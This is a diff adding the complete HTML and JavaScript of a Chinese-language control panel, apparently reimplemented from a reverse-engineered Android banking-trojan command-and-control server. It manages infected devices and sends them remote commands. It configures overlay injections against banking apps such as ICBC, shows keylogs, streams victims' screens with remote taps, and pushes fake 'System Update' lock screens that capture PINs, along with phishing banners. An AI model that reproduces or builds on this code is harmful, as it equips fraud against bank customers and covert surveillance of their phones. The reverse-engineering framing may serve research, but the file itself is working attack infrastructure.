@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>控制台 · 本地实现</title>
+<style>
+  :root{--bg:#0f1218;--panel:#161b24;--line:#26303d;--fg:#e6edf3;--dim:#8b98a8;--acc:#4f8cff;--ok:#37d67a;--warn:#ffb020;--err:#ff5c5c;--mono:ui-monospace,Consolas,"Cascadia Mono",monospace}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.55 system-ui,"Segoe UI",sans-serif}
+  header{display:flex;align-items:center;gap:14px;padding:10px 18px;background:var(--panel);border-bottom:1px solid var(--line)}
+  header h1{font-size:15px;margin:0;font-weight:600;letter-spacing:.3px}
+  header .tag{font:11px var(--mono);color:var(--dim);border:1px solid var(--line);border-radius:4px;padding:1px 6px}
+  header .sp{flex:1}
+  header .st{font:12px var(--mono);color:var(--ok)}
+  nav{display:flex;gap:2px;padding:0 14px;background:var(--panel);border-bottom:1px solid var(--line);overflow:auto}
+  nav button{background:none;border:0;border-bottom:2px solid transparent;color:var(--dim);padding:9px 13px;cursor:pointer;font-size:13px}
+  nav button.on{color:var(--fg);border-bottom-color:var(--acc)}
+  main{padding:16px 18px;max-width:1500px}
+  .row{display:flex;gap:12px;flex-wrap:wrap}
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px;flex:1;min-width:300px}
+  .card h3{margin:0 0 10px;font-size:13px;color:var(--dim);font-weight:600;letter-spacing:.4px;text-transform:uppercase}
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  th,td{text-align:left;padding:6px 8px;border-bottom:1px solid var(--line);vertical-align:top}
+  th{color:var(--dim);font-weight:500;font-size:12px}
+  tr:hover td{background:#1b2130}
+  input,select,textarea,button{font:13px inherit;color:var(--fg);background:#0d1117;border:1px solid var(--line);border-radius:7px;padding:7px 9px}
+  button{cursor:pointer;background:#1d2532}
+  button.p{background:var(--acc);border-color:var(--acc);color:#fff;font-weight:600}
+  button.d{background:#2a1719;border-color:#4a2226;color:#ff9a9a}
+  label{display:block;color:var(--dim);font-size:12px;margin:8px 0 3px}
+  .pill{font:11px var(--mono);border-radius:20px;padding:1px 8px;border:1px solid var(--line)}
+  .on{color:var(--ok);border-color:#1f4d33;background:#0f2a1c}
+  .off{color:var(--dim)}
+  pre{background:#0b0f15;border:1px solid var(--line);border-radius:8px;padding:10px;overflow:auto;max-height:260px;font:12px var(--mono);color:#b9c7d6}
+  .muted{color:var(--dim);font-size:12px}
+  .k{font:12px var(--mono);color:var(--acc)}
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px}
+  .hidden{display:none}
+</style>
+</head>
+<body>
+<header>
+  <h1>控制台</h1><span class="tag">本地部署版</span>
+  <span class="sp"></span>
+  <span class="st" id="who">未登录</span>
+  <button id="logout" class="hidden">退出</button>
+</header>
+<nav id="nav" class="hidden">
+  <button data-t="dev" class="on">设备</button>
+  <button data-t="scr">投屏控制</button>
+  <button data-t="cmd">指令下发</button>
+  <button data-t="inj">注入配置</button>
+  <button data-t="kl">键盘记录</button>
+  <button data-t="lock">锁屏 / 推送</button>
+  <button data-t="grp">分组 / 黑名单</button>
+  <button data-t="aud">审计</button>
+  <button data-t="db">数据层</button>
+</nav>
+<main>
+  <section id="login">
+    <div class="card" style="max-width:420px;margin:60px auto">
+      <h3>登录</h3>
+      <label>账号</label><input id="u" value="admin">
+      <label>口令</label><input id="p" type="password">
+      <p><button class="p" id="doLogin" style="width:100%">登录</button></p>
+      <div class="muted" id="logmsg">口令由服务端启动时打印（REFC2_PASS）</div>
+    </div>
+  </section>
+
+  <section id="t-dev" class="hidden">
+    <div class="row">
+      <div class="card"><h3>设备（每 3 秒刷新）</h3><div id="devs">加载中…</div></div>
+      <div class="card" style="max-width:380px"><h3>通道状态</h3><pre id="chan">-</pre></div>
+    </div>
+  </section>
+
+  <section id="t-cmd" class="hidden">
+    <div class="card">
+      <h3>下发指令（词表 163 条，来自协议分发器）</h3>
+      <div class="row">
+        <div style="flex:1;min-width:220px"><label>设备</label><select id="cmdDev"></select></div>
+        <div style="flex:1;min-width:220px"><label>指令</label><select id="cmdAct"></select></div>
+        <div style="min-width:160px"><label>过滤</label><input id="cmdFilter" placeholder="输入关键字过滤"></div>
+        <div style="min-width:120px"><label>&nbsp;</label><button class="p" id="send">发送</button></div>
+      </div>
+      <pre id="cmdOut">-</pre>
+    </div>
+  </section>
+
+  <section id="t-inj" class="hidden">
+    <div class="row">
+      <div class="card">
+        <h3>注入配置</h3>
+        <div id="injList">加载中…</div>
+        <label>包名（如 com.icbc）</label><input id="iPkg" placeholder="com.icbc">
+        <label>显示名（如 中国工商银行）</label><input id="iName" placeholder="中国工商银行">
+        <label>国家/地区</label><input id="iCC" placeholder="CN">
+        <p><label><input type="checkbox" id="iFs" style="width:auto"> 全屏覆盖</label>
+        <button class="p" id="iAdd">新增</button></p>
+      </div>
+      <div class="card" style="max-width:520px">
+        <h3>渲染预览（按 __BK 契约注入真配置）</h3>
+        <p><select id="iPrev"></select> <button id="iDoPrev">渲染</button></p>
+        <iframe id="iFrame" style="width:100%;height:420px;border:1px solid var(--line);border-radius:8px;background:#fff"></iframe>
+      </div>
+    </div>
+  </section>
+
+  <section id="t-scr" class="hidden">
+    <div class="row">
+      <div class="card" style="flex:0 0 auto">
+        <h3>投屏控制（真机画面）</h3>
+        <p><select id="scrDev"></select>
+           <button class="p" id="scrOn">连接</button>
+           <button id="scrOff">断开</button>
+           <span id="scrState" class="muted">未连接</span></p>
+        <div style="position:relative;display:inline-block">
+          <img id="scrImg" alt="(等待真机画面…)"
+               style="max-width:360px;border:1px solid var(--line);border-radius:8px;background:#000;cursor:crosshair">
+        </div>
+        <p class="muted" style="font-size:12px">
+          画面是真机 <span class="k">screencap</span> 抓的，尺寸是设备分辨率的一半；
+          在线条上点一下 = 真机点击，按住拖动 = 真机滑动。坐标换算：设备像素 = 图上像素 × 2。
+        </p>
+        <p><button id="kHome">HOME</button> <button id="kBack">返回</button>
+           <button id="kRecent">任务</button> <button id="kPower">电源</button>
+           <button id="kWake">唤醒</button> <button id="kLock">锁屏</button></p>
+        <p class="muted" id="scrPk">前台包：-</p>
+        <pre id="scrOut" style="max-height:140px;overflow:auto">-</pre>
+      </div>
+      <div class="card" style="flex:1 1 320px">
+        <h3>真机控件树（可点控件）</h3>
+        <p><label><input type="checkbox" id="treeOn"> 显示并跟随当前界面</label>
+           <span id="treeState" class="muted">未连接</span></p>
+        <div id="treeList" style="max-height:520px;overflow:auto">-</div>
+      </div>
+    </div>
+  </section>
+
+  <section id="t-kl" class="hidden">
+    <div class="card"><h3>键盘记录</h3>
+      <p><input id="klDev" placeholder="按设备过滤（可空）"> <button id="klLoad">刷新</button></p>
+      <div id="klList">-</div>
+    </div>
+  </section>
+
+  <section id="t-lock" class="hidden">
+    <div class="row">
+      <div class="card"><h3>假锁屏配置</h3>
+        <label>标题</label><input id="lkT" placeholder="System Update">
+        <label>免责文案</label><input id="lkD" placeholder="正在安装系统更新">
+        <label>PIN 位数</label><input id="lkN" value="6">
+        <p><button class="p" id="lkSave">保存</button> <span class="muted">原实现另有「远程锁屏/自动锁屏」两个同构端点</span></p>
+        <pre id="lkOut">-</pre>
+      </div>
+      <div class="card"><h3>推送 / 横幅</h3>
+        <label>标题</label><input id="psT">
+        <label>正文</label><input id="psB">
+        <label>链接</label><input id="psU">
+        <p><button class="p" id="psSave">保存配置</button> <button id="psSend">发送横幅</button></p>
+        <pre id="psOut">-</pre>
+      </div>
+    </div>
+  </section>
+
+  <section id="t-grp" class="hidden">
+    <div class="row">
+      <div class="card"><h3>设备分组</h3>
+        <label>名称</label><input id="gName" placeholder="REF-GROUP">
+        <label>颜色</label><input id="gColor" value="#4f8cff">
+        <p><button class="p" id="gAdd">新增/更新</button></p>
+        <div id="gList">-</div>
+      </div>
+      <div class="card"><h3>黑名单 / 备注 / 标记</h3>
+        <label>设备 ID</label><input id="bDev" placeholder="16 位 hex 设备号">
+        <label>备注</label><input id="bNote">
+        <p><button id="bNoteSave">存备注</button> <button id="bMark">标记</button> <button class="d" id="bBan">加黑名单</button></p>
+        <pre id="bOut">-</pre>
+      </div>
+    </div>
+  </section>
+
+  <section id="t-aud" class="hidden">
+    <div class="card"><h3>审计日志</h3><p><button id="audLoad">刷新</button></p><div id="audList">-</div></div>
+  </section>
+
+  <section id="t-db" class="hidden">
+    <div class="row">
+      <div class="card"><h3>数据层自检（SQLite）</h3><pre id="dbOut">-</pre></div>
+      <div class="card"><h3>说明</h3>
+        <p class="muted">表结构按反推字段建立：devices / device_events / inject_settings / inj_records /
+        inj_track / keylogs / memos / groups / users / sessions / audit / builds / ai_tasks / banners / kv。
+        判据：重启服务后仍能读回（见 <span class="k">verify_db.py</span>）。</p>
+      </div>
+    </div>
+  </section>
+</main>
+<script>
+const $=s=>document.querySelector(s), $$=s=>[...document.querySelectorAll(s)];
+let TOK=localStorage.getItem('refc2tok')||'';
+let ACTIONS=[];
+async function api(path,opt={}){
+  const h=opt.headers||{}; if(TOK)h['Authorization']='Bearer '+TOK;
+  if(opt.body)h['Content-Type']='application/json';
+  const r=await fetch(path,{...opt,headers:h});
+  let j=null; try{j=await r.json()}catch(e){j={raw:await r.text()}}
+  return {status:r.status,body:j};
+}
+function show(t){ $$('nav button').forEach(b=>b.classList.toggle('on',b.dataset.t===t));
+  ['dev','scr','cmd','inj','kl','lock','grp','aud','db'].forEach(x=>$('#t-'+x).classList.toggle('hidden',x!==t)); }
+async function login(){
+  const r=await api('/api/login',{method:'POST',body:JSON.stringify({username:$('#u').value,password:$('#p').value})});
+  if(r.status===200&&r.body.token){TOK=r.body.token;localStorage.setItem('refc2tok',TOK);boot();}
+  else $('#logmsg').textContent='登录失败：'+(r.body.error||r.status);
+}
+async function boot(){
+  const st=await api('/api/health');
+  if(st.status!==200&&st.status!==401){localStorage.removeItem('refc2tok');return;}
+  $('#who').textContent='已登录 · 路由 '+(st.body.routes||'-');
+  $('#logout').classList.remove('hidden'); $('#nav').classList.remove('hidden'); $('#login').classList.add('hidden');
+  const a=await api('/api/actions'); if(a.body&&a.body.actions)ACTIONS=a.body.actions;
+  $('#cmdAct').innerHTML=ACTIONS.map(x=>`<option>${x}</option>`).join('');
+  loadDev(); loadInj(); loadKl(); loadGrp(); loadAud(); loadDb(); bindScreen(); bindTree();
+  setInterval(loadDev,3000);
+}
+async function loadDev(){
+  const r=await api('/api/devices'); const d=r.body.devices||[];
+  $('#devs').innerHTML = d.length? '<table><tr><th>设备</th><th>状态</th><th>能力</th><th>截图</th><th>最后在线</th></tr>'+
+    d.map(x=>`<tr><td class="k">${x.deviceId}</td><td><span class="pill ${x.online?'on':'off'}">${x.online?'在线':'离线'}</span></td>
+      <td>${(x.caps||[]).join(', ')||'-'}</td><td>${x.shots||0}</td>
+      <td class="muted">${x.lastSeen?new Date(x.lastSeen*1000).toLocaleTimeString():'-'}</td></tr>`).join('')+'</table>'
+    : '<span class="muted">暂无设备（用 agent/refagent.py 连上来）</span>';
+  $('#chan').textContent=JSON.stringify(r.body,null,1).slice(0,900);
+  $('#cmdDev').innerHTML=d.map(x=>`<option value="${x.deviceId}">${x.deviceId}</option>`).join('');
+  $('#scrDev').innerHTML=d.map(x=>`<option value="${x.deviceId}">${x.deviceId}</option>`).join('');
+  $('#iPrev').innerHTML=(await api('/api/inject-settings')).body.items.map(i=>`<option value="${i.id}">${i.app_name} (${i.package_name})</option>`).join('');
+}
+async function loadInj(){
+  const r=await api('/api/inject-settings'); const items=r.body.items||[];
+  $('#injList').innerHTML = items.length? '<table><tr><th>包名</th><th>名称</th><th>全屏</th><th>启用</th><th></th></tr>'+
+    items.map(i=>`<tr><td class="k">${i.package_name}</td><td>${i.app_name}</td><td>${i.fullscreen?'是':'否'}</td>
+      <td>${i.enabled?'是':'否'}</td><td><button class="d" onclick="delInj('${i.id}')">删</button></td></tr>`).join('')+'</table>'
+    : '<span class="muted">暂无注入配置</span>';
+}
+window.delInj=async id=>{await api('/api/inject-settings?id='+id,{method:'DELETE'});loadInj();};
+async function loadKl(){ const d=$('#klDev').value;
+  const r=await api('/api/keylogs'+(d?('?deviceId='+encodeURIComponent(d)):''));
+  const l=r.body.list||[];
+  $('#klList').innerHTML=l.length?'<table><tr><th>时间</th><th>设备</th><th>包</th><th>类型</th><th>内容</th></tr>'+
+    l.map(x=>`<tr><td class="muted">${new Date(x.ts*1000).toLocaleString()}</td><td class="k">${x.deviceId||''}</td>
+      <td>${x.pkg||''}</td><td>${x.type||''}</td><td>${(x.text||'').slice(0,60)}</td></tr>`).join('')+'</table>'
+    : '<span class="muted">暂无记录</span>'; }
+async function loadGrp(){ const r=await api('/api/device-groups');
+  $('#gList').innerHTML=(r.body.groups||[]).map(g=>`<div class="muted">${g.name} · ${g.color} · ${(g.deviceIds||[]).length} 台</div>`).join('')||'<span class="muted">暂无分组</span>'; }
+async function loadAud(){ const r=await api('/api/audit_logs');
+  $('#audList').innerHTML='<table><tr><th>时间</th><th>操作者</th><th>动作</th><th>详情</th></tr>'+
+    (r.body.list||[]).map(x=>`<tr><td class="muted">${new Date(x.ts*1000).toLocaleString()}</td><td>${x.actor}</td><td class="k">${x.action}</td><td>${x.detail||''}</td></tr>`).join('')+'</table>'; }
+async function loadDb(){ const r=await api('/api/db-stats'); $('#dbOut').textContent=JSON.stringify(r.body,null,1); }
+
+/* ---------------- 投屏控制：真机画面 + 点击/滑动 + 控件树 ---------------- */
+// 通道与厂商面板同款：wss://host/api/sl/ws?id=<设备>&token=<会话>，服务端推**原始 PNG 帧**。
+// 画面是设备分辨率的一半（1080x2400 -> 540x1200），所以点击换算 = 图上像素 × 2。
+let SCR=null, TREE=null, SCR_DEV='';
+function wsUrl(p,id){ const s=location.protocol==='https:'?'wss:':'ws:';
+  return `${s}//${location.host}${p}?id=${encodeURIComponent(id)}&token=${encodeURIComponent(TOK)}`; }
+function scrState(t){ $('#scrState').textContent=t; }
+function scrCmd(action,data){
+  api('/api/command',{method:'POST',body:JSON.stringify({deviceId:SCR_DEV,action:action,data:data||{}})})
+    .then(r=>{ $('#scrOut').textContent=new Date().toLocaleTimeString()+'  '+action+' -> '+JSON.stringify(r.body); });
+}
+function scrConnect(){
+  SCR_DEV=$('#scrDev').value; if(!SCR_DEV){scrState('先选设备');return;}
+  scrDisconnect(false);
+  SCR=new WebSocket(wsUrl('/api/sl/ws',SCR_DEV)); SCR.binaryType='arraybuffer';
+  scrState('连接中…');
+  SCR.onopen=()=>{ scrState('已连接 · 收真机画面中'); scrCmd('startSilentStream',{quality:40,size:3}); };
+  SCR.onmessage=e=>{ if(!(e.data instanceof ArrayBuffer)||e.data.byteLength<50)return;
+    const url=URL.createObjectURL(new Blob([e.data],{type:'image/png'}));
+    const img=$('#scrImg'); if(img._u)URL.revokeObjectURL(img._u); img._u=url; img.src=url;
+    scrState('画面中 · '+e.data.byteLength+' B/帧'); };
+  SCR.onclose=()=>{ scrState('已断开'); };
+  SCR.onerror=()=>{ scrState('连接出错（看后端日志）'); };
+}
+function scrDisconnect(send=true){
+  if(SCR){ try{ if(send&&SCR_DEV)scrCmd('stopSilentStream',{}); SCR.close(); }catch(e){} SCR=null; }
+  scrState('未连接');
+}
+function scrPoint(ev){
+  const img=$('#scrImg'), r=img.getBoundingClientRect();
+  if(!img.naturalWidth)return null;
+  const k=2;   // 图 = 设备一半分辨率
+  return { x: Math.round((ev.clientX-r.left)/r.width*img.naturalWidth*k),
+           y: Math.round((ev.clientY-r.top)/r.height*img.naturalHeight*k) };
+}
+function bindScreen(){
+  const img=$('#scrImg'); let down=null;
+  img.addEventListener('mousedown',e=>{ down=scrPoint(e); });
+  img.addEventListener('mouseup',e=>{
+    if(!down)return; const up=scrPoint(e); if(!up)return;
+    const dist=Math.hypot(up.x-down.x, up.y-down.y);
+    if(dist<24){ scrCmd('clickPoint',{x:up.x,y:up.y}); }
+    else { scrCmd('adbSwipe',{x1:down.x,y1:down.y,x2:up.x,y2:up.y,duration:250}); }
+    down=null;
+  });
+  $('#scrOn').onclick=scrConnect;
+  $('#scrOff').onclick=()=>scrDisconnect(true);
+  $('#kHome').onclick=()=>scrCmd('adbKeyEvent',{key:'KEYCODE_HOME'});
+  $('#kBack').onclick=()=>scrCmd('adbKeyEvent',{key:'KEYCODE_BACK'});
+  $('#kRecent').onclick=()=>scrCmd('adbKeyEvent',{key:'KEYCODE_APP_SWITCH'});
+  $('#kPower').onclick=()=>scrCmd('adbKeyEvent',{key:'KEYCODE_POWER'});
+  $('#kWake').onclick=()=>scrCmd('wakeup',{});
+  $('#kLock').onclick=()=>scrCmd('lockScreen',{});
+}
+function treeConnect(){
+  if(TREE){ TREE.close(); TREE=null; }
+  if(!$('#treeOn').checked){ $('#treeState').textContent='未连接'; return; }
+  if(!SCR_DEV)SCR_DEV=$('#scrDev').value;
+  TREE=new WebSocket(wsUrl('/api/ut/ws',SCR_DEV));
+  $('#treeState').textContent='连接中…';
+  TREE.onopen=()=>{ $('#treeState').textContent='已连接'; };
+  TREE.onmessage=e=>{
+    let j=null; try{ j=JSON.parse(e.data); }catch(err){ return; }
+    if(j.status){ $('#treeState').textContent=j.status; return; }
+    $('#treeState').textContent='跟随中 · '+j.count+' 节点 · '+j.pkg;
+    $('#scrPk').textContent='前台包：'+(j.pkg||'-');
+    const rows=(j.root||[]).filter(n=>(n.text||'').trim()||n.edit||n.click);
+    $('#treeList').innerHTML=rows.length? '<table><tr><th>文本/ID</th><th>类型</th><th>范围</th><th></th></tr>'+
+      rows.slice(0,300).map((n,i)=>`<tr><td>${(n.text||n.resId||'').slice(0,40)}</td>
+        <td class="muted">${(n.cls||'').split('.').pop()}${n.edit?' · 输入框':''}${n.click?' · 可点':''}</td>
+        <td class="muted">${(n.b||[]).join(',')}</td>
+        <td>${n.click?`<button data-i="${i}">点它</button>`:''}</td></tr>`).join('')+'</table>'
+      : '<span class="muted">这一帧没有可点控件</span>';
+    $$('#treeList button').forEach(btn=>btn.onclick=()=>{
+      const n=rows[parseInt(btn.dataset.i)]; if(!n||!n.b)return;
+      scrCmd('clickPoint',{x:Math.round((n.b[0]+n.b[2])/2), y:Math.round((n.b[1]+n.b[3])/2)});
+    });
+  };
+  TREE.onclose=()=>{ $('#treeState').textContent='已断开'; };
+}
+function bindTree(){
+  $('#treeOn').onchange=treeConnect;
+}
+
+$('#doLogin').onclick=login; $('#p').addEventListener('keydown',e=>{if(e.key==='Enter')login()});
+$('#logout').onclick=()=>{localStorage.removeItem('refc2tok');location.reload()};
+$$('nav button').forEach(b=>b.onclick=()=>show(b.dataset.t));
+$('#cmdFilter').oninput=e=>{const k=e.target.value.toLowerCase();
+  $('#cmdAct').innerHTML=ACTIONS.filter(a=>a.toLowerCase().includes(k)).map(a=>`<option>${a}</option>`).join('');};
+$('#send').onclick=async()=>{ const r=await api('/api/command',{method:'POST',
+  body:JSON.stringify({deviceId:$('#cmdDev').value,action:$('#cmdAct').value})});
+  $('#cmdOut').textContent=JSON.stringify(r.body,null,1); };
+$('#iAdd').onclick=async()=>{ await api('/api/inject-settings/add',{method:'POST',body:JSON.stringify({
+  package_name:$('#iPkg').value,app_name:$('#iName').value,country:$('#iCC').value,fullscreen:$('#iFs').checked})});
+  $('#iPkg').value='';$('#iName').value='';loadInj(); };
+$('#iDoPrev').onclick=()=>{ const id=$('#iPrev').value; if(!id)return;
+  $('#iFrame').src='/api/inject-render?id='+id; };
+$('#klLoad').onclick=loadKl;
+$('#lkSave').onclick=async()=>{ const r=await api('/api/lockscreen-auto-config',{method:'POST',body:JSON.stringify({
+  enabled:true,title:$('#lkT').value,disclaimer:$('#lkD').value,pin_length:parseInt($('#lkN').value||'6')})});
+  $('#lkOut').textContent=JSON.stringify(r.body,null,1); };
+$('#psSave').onclick=async()=>{ const r=await api('/api/push-config',{method:'POST',body:JSON.stringify({
+  enabled:true,title:$('#psT').value,body:$('#psB').value,url:$('#psU').value})});
+  $('#psOut').textContent=JSON.stringify(r.body,null,1); };
+$('#psSend').onclick=async()=>{ const r=await api('/api/send-banner',{method:'POST',body:JSON.stringify({
+  title:$('#psT').value,body:$('#psB').value,url:$('#psU').value})});
+  $('#psOut').textContent=JSON.stringify(r.body,null,1); };
+$('#gAdd').onclick=async()=>{ const r=await api('/api/device-groups',{method:'PUT',body:JSON.stringify({
+  name:$('#gName').value,color:$('#gColor').value,deviceIds:[]})});
+  $('#gList').insertAdjacentHTML('afterbegin','<div class="muted">新增: '+JSON.stringify(r.body.group)+'</div>'); loadGrp(); };
+$('#bNoteSave').onclick=async()=>{ const r=await api('/api/note',{method:'POST',body:JSON.stringify({
+  deviceId:$('#bDev').value,note:$('#bNote').value})}); $('#bOut').textContent=JSON.stringify(r.body); };
+$('#bMark').onclick=async()=>{ const r=await api('/api/device-mark',{method:'POST',body:JSON.stringify({
+  deviceId:$('#bDev').value,mark:'REF-MARK'})}); $('#bOut').textContent=JSON.stringify(r.body); };
+$('#bBan').onclick=async()=>{ const r=await api('/api/blacklist',{method:'POST',body:JSON.stringify({
+  deviceIds:[$('#bDev').value]})}); $('#bOut').textContent=JSON.stringify(r.body); };
+$('#audLoad').onclick=loadAud;
+if(TOK)boot();
+</script>
+</body></html>
